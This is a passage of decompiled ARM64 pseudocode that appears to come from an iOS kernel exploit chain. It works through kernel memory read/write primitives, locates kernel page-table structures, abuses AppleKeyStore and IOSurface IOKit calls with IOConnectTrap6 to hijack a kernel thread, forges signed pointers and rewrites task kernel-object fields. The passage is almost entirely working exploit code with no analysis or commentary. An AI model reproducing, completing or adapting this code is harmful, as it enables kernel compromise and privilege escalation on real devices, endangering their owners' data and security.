    v22 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v20 + v21);
    if ( (v22 & 0xFC000000) == 0x94000000 && v20 + v21 + (v22 << 38 >> 36) == gadgets->adrDataRef )
      break;
    v21 += 4;
    if ( (uint32_t)v21 == 768 )
    {
      v23 = 0;
      goto LABEL_20;
    }
  }
  v23 = v20 + v21;
LABEL_20:
  v24 = 0;
  if ( v6 <= 0x918C5A833FFLL )
    v25 = -117434784;
  else
    v25 = -117434688;
  while ( 1 )
  {
    v26 = v23 + v24;
    if ( (unsigned int)read_u32_from_kobj_snapshot((__int64)a2, *a2, v23 + v24) == v25 )
      break;
    v24 -= 4;
    if ( (uint32_t)v24 == -128 )
    {
      v26 = 0;
      break;
    }
  }
  v27 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v26 + 4);
  gadgets->vmPageArray = ((v26 + 4) & 0xFFFFFFFFFFFFF000LL)
                        + 2LL * (int)(((v27 >> 18) & 0x1800) | (v27 >> 5 << 13))
                        + (((unsigned int)read_u32_from_kobj_snapshot((__int64)a2, *a2, v26 + 8) >> 7) & 0x7FF8);
  v28 = LOOKUP_KOBJ_PATTERN(a2, vmPageArrayWords, vmPageArrayMasks, 5);
  gadgets->pmapTteTable = v28;
  v29 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v28 + 4);
  v30 = read_u32_from_kobj_snapshot((__int64)a2, *a2, gadgets->pmapTteTable + 8LL);
  result = 0;
  gadgets->pmapTteTable = ((gadgets->pmapTteTable + 4LL) & 0xFFFFFFFFFFFFF000LL)
                        + 2LL * (int)(((v29 >> 18) & 0x1800) | (v29 >> 5 << 13))
                        + ((v30 >> 7) & 0x7FF8);
  return result;
}

//----- (000000000001AA90) ----------------------------------------------------
__int64 __fastcall spin_wait_el0_transition(__int64 result)
{
  __int64 v1; // x19

  if ( *(uint32_t *)(result + 20) )
  {
    v1 = result;
    do
    {
      if ( (_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) & 0xFFC) != 0 )
        result = thread_switch(*(uint32_t *)(v1 + 20), 0, 0);
    }
    while ( *(uint32_t *)(v1 + 20) );
  }
  return result;
}

//----- (000000000001AADC) ----------------------------------------------------
__int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
{
  const CFDictionaryRef *v4; // x0
  io_service_t MatchingService; // w0
  unsigned __int64 v6; // x21
  __int64 v7; // x0
  unsigned __int64 v8; // x23
  struct_krwCtx *v9; // x24
  __int64 v10; // x0
  unsigned __int64 v11; // x0
  __int64 v12; // x24
  __int64 v13; // x25
  __int64 v14; // x0
  struct_krwCtx *v15; // x24
  __int64 v16; // x0
  unsigned __int64 v17; // x0
  __int64 v18; // x24
  __int64 v19; // x25
  __int64 v20; // x0
  struct_krwCtx *v21; // x24
  __int64 v22; // x0
  unsigned __int64 v23; // x0
  __int64 v24; // x24
  __int64 v25; // x25
  __int64 v26; // x0
  struct_krwCtx *v27; // x24
  __int64 v28; // x0
  unsigned __int64 v29; // x0
  __int64 v30; // x24
  __int64 v31; // x25
  __int64 v32; // x0
  struct_krwCtx *v33; // x24
  __int64 v34; // x0
  unsigned __int64 v35; // x0
  __int64 v36; // x24
  __int64 v37; // x25
  __int64 v38; // x0
  struct_krwCtx *v39; // x24
  __int64 v40; // x0
  unsigned __int64 v41; // x0
  __int64 v42; // x24
  __int64 v43; // x25
  __int64 v44; // x0
  struct_krwCtx *v45; // x24
  __int64 v46; // x0
  unsigned __int64 v47; // x0
  __int64 v48; // x24
  __int64 v49; // x25
  __int64 v50; // x0
  struct_krwCtx *v51; // x24
  __int64 v52; // x0
  unsigned __int64 v53; // x0
  __int64 v54; // x24
  __int64 v55; // x25
  __int64 v56; // x0
  struct_krwCtx *v57; // x24
  __int64 v58; // x0
  unsigned __int64 v59; // x0
  __int64 v60; // x23
  __int64 v61; // x24
  __int64 v62; // x0
  __int64 v63; // x23
  __int64 v64; // x24
  __int64 v65; // x0
  __int64 v66; // x23
  __int64 v67; // x24
  __int64 v68; // x0
  __int64 v69; // x23
  __int64 v70; // x24
  __int64 v71; // x0
  __int64 v72; // x0
  __int64 v73; // x22
  __int64 v74; // x0
  unsigned __int64 v75; // x0
  __int64 result; // x0
  __int128 v77; // [xsp+10h] [xbp-50h] BYREF

  v4 = IOServiceMatching("AppleKeyStore");
  MatchingService = IOServiceGetMatchingService(kIOMasterPortDefault, v4);
  IOServiceOpen(MatchingService, mach_task_self_, 0, (io_connect_t *)a2);
  v6 = get_task_kobject_addr_from_field32(*(uint64_t *)a1, *(uint32_t *)a2);
  *(uint64_t *)(a2 + 24) = kread_u64_value(*(uint64_t *)a1, v6 + 72);
  v7 = kread_u64_value(*(uint64_t *)a1, v6);
  *(uint64_t *)(a2 + 32) = v7;
  v8 = krw_xpac_vaddr_2(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32), v7);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v77);
  *(uint64_t *)(a2 + 16) = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
                           *(uint64_t *)(a1 + 8),
                           qword_480A0,
                           2,
                           &v77);
  v9 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v10 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48048);
  v11 = krw_xpac_vaddr_2(v9, v10);
  v12 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48048;
  v13 = *(uint64_t *)a1;
  v14 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v11,
          (v12 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4804A << 48));
  kwrite_u64_to_addr(v13, v12, v14);
  v15 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v16 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_4804C);
  v17 = krw_xpac_vaddr_2(v15, v16);
  v18 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_4804C;
  v19 = *(uint64_t *)a1;
  v20 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v17,
          (v18 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4804E << 48));
  kwrite_u64_to_addr(v19, v18, v20);
  v21 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v22 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48050);
  v23 = krw_xpac_vaddr_2(v21, v22);
  v24 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48050;
  v25 = *(uint64_t *)a1;
  v26 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v23,
          (v24 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48052 << 48));
  kwrite_u64_to_addr(v25, v24, v26);
  v27 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v28 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48054);
  v29 = krw_xpac_vaddr_2(v27, v28);
  v30 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48054;
  v31 = *(uint64_t *)a1;
  v32 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v29,
          (v30 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48056 << 48));
  kwrite_u64_to_addr(v31, v30, v32);
  v33 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v34 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48058);
  v35 = krw_xpac_vaddr_2(v33, v34);
  v36 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48058;
  v37 = *(uint64_t *)a1;
  v38 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v35,
          (v36 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4805A << 48));
  kwrite_u64_to_addr(v37, v36, v38);
  v39 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v40 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_4805C);
  v41 = krw_xpac_vaddr_2(v39, v40);
  v42 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_4805C;
  v43 = *(uint64_t *)a1;
  v44 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v41,
          (v42 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4805E << 48));
  kwrite_u64_to_addr(v43, v42, v44);
  v45 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v46 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48060);
  v47 = krw_xpac_vaddr_2(v45, v46);
  v48 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48060;
  v49 = *(uint64_t *)a1;
  v50 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v47,
          (v48 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48062 << 48));
  kwrite_u64_to_addr(v49, v48, v50);
  v51 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v52 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48070);
  v53 = krw_xpac_vaddr_2(v51, v52);
  v54 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48070;
  v55 = *(uint64_t *)a1;
  v56 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v53,
          (v54 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48072 << 48));
  kwrite_u64_to_addr(v55, v54, v56);
  v57 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v58 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48064);
  v59 = krw_xpac_vaddr_2(v57, v58);
  v60 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48064;
  v61 = *(uint64_t *)a1;
  v62 = (*(__int64 (__fastcall **)(uint64_t, unsigned __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          v59,
          (v60 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48066 << 48));
  kwrite_u64_to_addr(v61, v60, v62);
  v63 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_4806C;
  v64 = *(uint64_t *)a1;
  v65 = (*(__int64 (__fastcall **)(uint64_t, __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48078,
          (v63 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4806E << 48));
  kwrite_u64_to_addr(v64, v63, v65);
  v66 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48068;
  v67 = *(uint64_t *)a1;
  v68 = (*(__int64 (__fastcall **)(uint64_t, __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48078 + 4,
          (v66 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4806A << 48));
  kwrite_u64_to_addr(v67, v66, v68);
  v69 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48064;
  v70 = *(uint64_t *)a1;
  v71 = (*(__int64 (__fastcall **)(uint64_t, __int64, unsigned __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48078 + 4,
          (v69 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48066 << 48));
  kwrite_u64_to_addr(v70, v69, v71);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v77);
  v72 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
          2,
          &v77);
  *(uint64_t *)(a2 + 8) = v72;
  kwrite_u64_to_addr(*(uint64_t *)a1, v72 + 16, 0);
  kwrite_u64_to_addr(*(uint64_t *)a1, v6 + 72, *(uint64_t *)(a2 + 8));
  flush_cpu_cache(*(uint64_t *)a1, v6 + 156, 273);
  v73 = *(uint64_t *)a1;
  v74 = (*(__int64 (__fastcall **)(uint64_t, uint64_t, unsigned __int64))(**(uint64_t **)(a1 + 8) + 32LL))(
          *(uint64_t *)(a1 + 8),
          *(uint64_t *)(a2 + 16),
          (v6 & 0xFFFFFFFFFFFFLL) | 0xCDA1000000000000LL);
  kwrite_u64_to_addr(v73, v6, v74);
  *(uint64_t *)&v77 = *(uint64_t *)(a2 + 8);
  v75 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480B0,
          1,
          &v77);
  result = physmap_map_cached(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32), v75, a2 + 40);
  **(uint64_t **)(a2 + 40) = 0;
  return result;
}
// 0: using guessed type int def_3E8F0;
// 4: using guessed type int dword_4;
// 8: using guessed type int dword_8;
// C: using guessed type int;
// 10: using guessed type int dword_10;
// 14: using guessed type int;
// 18: using guessed type int;
// 1C: using guessed type int;
// 20: using guessed type segment_command_64 stru_20;

//----- (000000000001B158) ----------------------------------------------------
__int64 __fastcall write_task_kobject_fields(__int64 a1, __int64 a2)
{
  unsigned __int64 v4; // x21
  double v5; // d0
  __int64 result; // x0
  __int64 v7; // [xsp+8h] [xbp-38h] BYREF
  __int64 v8; // [xsp+10h] [xbp-30h]

  v4 = get_task_kobject_addr_from_field32(*(uint64_t *)a1, *(uint32_t *)a2);
  kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 72, *(uint64_t *)(a2 + 24));
  kwrite_u64_to_addr(*(uint64_t *)a1, v4, *(uint64_t *)(a2 + 32));
  flush_cpu_cache(*(uint64_t *)a1, v4 + 156, 0);
  v5 = physmap_unmap_cached(*(uint64_t *)(*(uint64_t *)a1 + 32LL), a2 + 40);
  v7 = *(uint64_t *)(a2 + 8);
  v8 = 0x4000;
  (*(void (__fastcall **)(uint64_t, __int64, __int64, __int64 *, double))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_480A8,
    2,
    &v7,
    v5);
  v7 = *(uint64_t *)(a2 + 16);
  v8 = 0x4000;
  (*(void (__fastcall **)(uint64_t, __int64, __int64, __int64 *))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_480A8,
    2,
    &v7);
  result = IOServiceClose(*(uint32_t *)a2);
  *(uint32_t *)a2 = 0;
  return result;
}

//----- (000000000001B280) ----------------------------------------------------
__int64 __fastcall trigger_iokit_property_exploit(__int64 a1)
{
  __int128 v3; // [xsp+20h] [xbp-30h] BYREF

  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v3);
  *(uint64_t *)&v3 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
                     *(uint64_t *)(a1 + 8),
                     qword_480A0,
                     2,
                     &v3);
  (*(void (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_480B0,
    1,
    &v3);
  (*(void (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 18);
  return (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 16);
}

//----- (000000000001B360) ----------------------------------------------------
__int64 __fastcall wait_thread_ready(__int64 a1, uint64_t **a2)
{
  uint64_t *i; // x8
  __int16 j; // w8
  mach_port_name_t v6; // w0
  thread_act_t v7; // w0
  __int64 result; // x0
  integer_t policy_info[4]; // [xsp+30h] [xbp-30h] BYREF

  for ( i = *a2; *i; i = *a2 )
    sched_yield();
  for ( j = _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)); (j & 0xFFC) != 0; j = _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) )
  {
    v6 = mach_thread_self();
    thread_switch(v6, 0, 0);
  }
  policy_info[0] = kThreadHijackReadyPolicy[0];
  policy_info[1] = kThreadHijackReadyPolicy[1];
  policy_info[2] = kThreadHijackReadyPolicy[2];
  policy_info[3] = kThreadHijackReadyPolicy[3];
  v7 = mach_thread_self();
  thread_policy_set(v7, 2u, policy_info, 4u);
  result = (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 53);
  **a2 = 2;
  return result;
}

//----- (000000000001B42C) ----------------------------------------------------
__int64 __fastcall thread_hijack_exploit(__int64 a1)
{
  unsigned __int64 v2; // x26
  thread_act_t v3; // w0
  __int64 v4; // x20
  __int64 v5; // x21
  __int64 v6; // x0
  struct_krwCtx *v7; // x21
  __int64 v8; // x0
  unsigned __int64 v9; // x0
  struct_krwCtx *v10; // x21
  __int64 v11; // x0
  unsigned __int64 v12; // x22
  __int64 v13; // x21
  __int64 v14; // x0
  __int64 v16; // x0
  __int64 v17; // x0
  __int64 v18; // x21
  __int64 v19; // x23
  __int64 v20; // x0
  __int64 v21; // x21
  __int64 v22; // x23
  __int64 v23; // x8
  __int64 v24; // x0
  bool v25; // zf
  __int64 v26; // x24
  __int64 v27; // x21
  __int64 v28; // x0
  unsigned __int64 v29; // x8
  __int64 v30; // x28
  mach_port_name_t v32; // w0
  __int64 v33; // x8
  int v34; // w21
  __int64 v35; // x9
  __int64 v36; // x20
  __int64 v37; // [xsp+40h] [xbp-400h]
  unsigned __int64 v38; // [xsp+48h] [xbp-3F8h]
  __int64 v39; // [xsp+50h] [xbp-3F0h]
  __int64 v40; // [xsp+58h] [xbp-3E8h]
  __int64 v41; // [xsp+60h] [xbp-3E0h]
  __int64 v42; // [xsp+68h] [xbp-3D8h]
  uintptr_t v43; // [xsp+70h] [xbp-3D0h]
  unsigned __int64 v44; // [xsp+78h] [xbp-3C8h]
  __int64 v45; // [xsp+88h] [xbp-3B8h]
  uintptr_t v46; // [xsp+90h] [xbp-3B0h]
  pthread_t v48; // [xsp+108h] [xbp-338h] BYREF
  __int64 v50; // [xsp+138h] [xbp-308h] BYREF
  __int128 policy_info; // [xsp+140h] [xbp-300h] BYREF
  __int128 connect[2]; // [xsp+150h] [xbp-2F0h] BYREF
  __int128 v53; // [xsp+170h] [xbp-2D0h]
  __int128 v54; // [xsp+180h] [xbp-2C0h]
  __int128 v55; // [xsp+190h] [xbp-2B0h]
  __int128 v56; // [xsp+1A0h] [xbp-2A0h]
  __int128 v57; // [xsp+1B0h] [xbp-290h] BYREF
  uint64_t v58[64]; // [xsp+1C8h] [xbp-278h] BYREF

  v2 = *(uint64_t *)algn_480E0;
  if ( strstr((const char *)qword_480D8, "T8020") )
    return 5;
  v55 = 0u;
  v56 = 0u;
  v53 = 0u;
  v54 = 0u;
  memset(connect, 0, sizeof(connect));
  necp_set_opt_string_2(a1, (__int64)connect);
  ((integer_t *)&policy_info)[0] = kThreadHijackMainPolicy[0];
  ((integer_t *)&policy_info)[1] = kThreadHijackMainPolicy[1];
  ((integer_t *)&policy_info)[2] = kThreadHijackMainPolicy[2];
  ((integer_t *)&policy_info)[3] = kThreadHijackMainPolicy[3];
  v3 = mach_thread_self();
  thread_policy_set(v3, 2u, (thread_policy_t)&policy_info, 4u);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
  v4 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
         *(uint64_t *)(a1 + 8),
         qword_480A0,
         2,
         &v57);
  kwrite_u64_to_addr(*(uint64_t *)a1, v4, 0xBEE5000000010003LL);
  kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 8, v4 + 256);
  kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 16, v4 + 512);
  kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 24, v4 + 768);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
  v5 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
         *(uint64_t *)(a1 + 8),
         qword_480A0,
         2,
         &v57);
  while ( 1 )
  {
    v6 = (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 48);
    if ( (unsigned __int8)v6 != 6 )
      break;
    trigger_iokit_property_exploit(a1);
  }
  if ( v6 )
    return 5;
  v45 = kread_u64_value(*(uint64_t *)a1, v5);
  v7 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v8 = kread_u64_value(*(uint64_t *)a1, *(uint64_t *)(*(uint64_t *)a1 + 16LL) + 40LL);
  v9 = krw_xpac_vaddr_2(v7, v8);
  v10 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
  v11 = kread_u64_value(*(uint64_t *)a1, v9 + 64);
  v12 = krw_xpac_vaddr_2(v10, v11);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
  v13 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
          2,
          &v57);
  kwrite_u64_to_addr(*(uint64_t *)a1, v13, 0);
  v58[0] = v13;
  (*(void (__fastcall **)(uint64_t, __int64, __int64, uint64_t *))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_480B0,
    1,
    v58);
  while ( 1 )
  {
    v14 = (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 10);
    if ( (unsigned __int8)v14 != 6 )
      break;
    trigger_iokit_property_exploit(a1);
  }
  if ( v14 )
    return 5;
  MEMORY[0x400004008] = 1094795585;
  v16 = kread_u64_value(*(uint64_t *)a1, v12);
  v58[0] = kread_u64_value(*(uint64_t *)a1, v16) & 0xFFFFFFFFC000LL;
  v17 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, uint64_t *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480B8,
          1,
          v58);
  v18 = kread_u64_value(*(uint64_t *)a1, v17 + 4096) & 0xFFFFFFFFC000LL;
  v58[0] = v18;
  v42 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, uint64_t *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480B8,
          1,
          v58);
  v44 = (kread_u64_value(*(uint64_t *)a1, v42 + 8) & 0xFFFF000000003FFFLL) | v18;
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
  v43 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
          2,
          &v57);
  v19 = *(uint64_t *)a1;
  v20 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48098,
          20592);
  kwrite_u64_to_addr(v19, v43 + 64, v20);
  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
  v46 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
          2,
          &v57);
  v21 = 0;
  do
  {
    v22 = kThreadHijackAllocCandidates[v21].size;
    v23 = kThreadHijackAllocCandidates[v21].pageCount;
    *(uint64_t *)&v57 = (v22 + 0x3FFF) & 0xFFFFFFFFFFFFC000LL;
    *((uint64_t *)&v57 + 1) = v23;
    v24 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
            *(uint64_t *)(a1 + 8),
            qword_480A0,
            2,
            &v57);
    if ( v24 )
      v25 = 1;
    else
      v25 = v21 == 2;
    ++v21;
  }
  while ( !v25 );
  v26 = v24;
  v27 = kread_u64_value(*(uint64_t *)a1, qword_480C8);
  v39 = kread_u64_value(*(uint64_t *)a1, qword_480D0);
  v58[0] = v26;
  v28 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, uint64_t *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480B0,
          1,
          v58);
  v50 = 1;
  v29 = v44;
  if ( v2 > 0x918C5A833FFLL )
    v29 = v42;
  v37 = ((unsigned __int64)(v28 - v27) >> 13) & 0x7FFFFFFFFFFFELL;
  v38 = v29;
  v41 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48080,
          28765);
  v40 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64))(**(uint64_t **)(a1 + 8) + 16LL))(
          *(uint64_t *)(a1 + 8),
          qword_48088,
          28765);
  v30 = 0;
  *(uint32_t *)(a1 + 20) = mach_thread_self();
  void (^spinWaitBlock)(void) = ^{
    spin_wait_el0_transition(a1);
  };
  do
    pthread_create(
      (pthread_t *)&v58[v30++],
      0,
      recomp_run_copied_void_block_thread,
      recomp_copy_void_block_thread_arg(spinWaitBlock));
  while ( v30 != 64 );
  uint64_t *waitState = (uint64_t *)&v50;
  void (^waitThreadBlock)(void) = ^{
    wait_thread_ready(a1, &waitState);
  };
  pthread_create(&v48, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(waitThreadBlock));
  while ( (_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) & 0xFFC) == 0 )
  {
    v32 = mach_thread_self();
    thread_switch(v32, 0, 0);
  }
  v50 = 0;
  while ( (kread_u32_value(*(uint64_t *)a1, v37 + v39) & 0x8000) == 0 )
    ;
  v33 = *((uint64_t *)&v53 + 1);
  **((uint64_t **)&v53 + 1) = v45;
  *(uint64_t *)(v33 + 8) = v40;
  IOConnectTrap6(connect[0], 0, 0xBEE2u, 0, 0, 0, 0, 0);
  v34 = 8;
  do
  {
    v35 = *((uint64_t *)&v53 + 1);
    **((uint64_t **)&v53 + 1) = qword_480C0;
    *(uint64_t *)(v35 + 8) = v41;
    IOConnectTrap6(connect[0], 0, v43, v4, 0x20u, v46, 0, 0);
    --v34;
  }
  while ( v34 );
  while ( v50 != 2 )
    ;
  *(uint64_t *)&v57 = v26;
  *((uint64_t *)&v57 + 1) = (v22 + 0x3FFF) & 0xFFFFFFFFFFFFC000LL;
  (*(void (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_480A8,
    2,
    &v57);
  __dsb(0xFu);
  (*(void (__fastcall **)(uint64_t, __int64, uint64_t, uint64_t))(**(uint64_t **)(a1 + 8) + 8LL))(
    *(uint64_t *)(a1 + 8),
    qword_48090,
    0,
    0);
  v36 = 0;
  *(uint32_t *)(a1 + 20) = 0;
  do
    pthread_join((pthread_t)v58[v36++], 0);
  while ( v36 != 64 );
  pthread_join(v48, 0);
  write_task_kobject_fields(a1, (__int64)connect);
  return 0;
}
// 20: using guessed type segment_command_64 stru_20;

//----- (000000000001BC78) ----------------------------------------------------
__int64 __fastcall get_task_vm_region_base(task_name_t a1)
{
  uint64_t *v3; // x20
  vm_size_t outsize; // [xsp+8h] [xbp-28h] BYREF
  __int64 v5; // [xsp+10h] [xbp-20h] BYREF
  __int64 v6; // [xsp+18h] [xbp-18h] BYREF

  if ( (unsigned int)get_task_vm_info_0(a1, &v6) )
    return 0;
  v3 = (uint64_t *)(v6 + 40);
  if ( mach_task_self_ == a1 )
  {
    *v3 |= 1uLL;
  }
  else
  {
    if ( vm_read_overwrite(a1, v6 + 40, 8u, (vm_address_t)&v5, &outsize) )
      return 0;
    v5 |= 1uLL;
    if ( vm_write(a1, (vm_address_t)v3, (vm_offset_t)&v5, 8u) )
      return 0;
  }
  return 1;
}

//----- (000000000001BD24) ----------------------------------------------------
__int64 __fastcall get_task_vm_info_0(task_name_t a1, uint64_t *a2)
{
  __int64 result; // x0
  mach_msg_type_number_t task_info_outCnt; // [xsp+4h] [xbp-2Ch] BYREF
  integer_t task_info_out[6]; // [xsp+8h] [xbp-28h] BYREF

  task_info_outCnt = 5;
  result = task_info(a1, 0x11u, task_info_out, &task_info_outCnt);
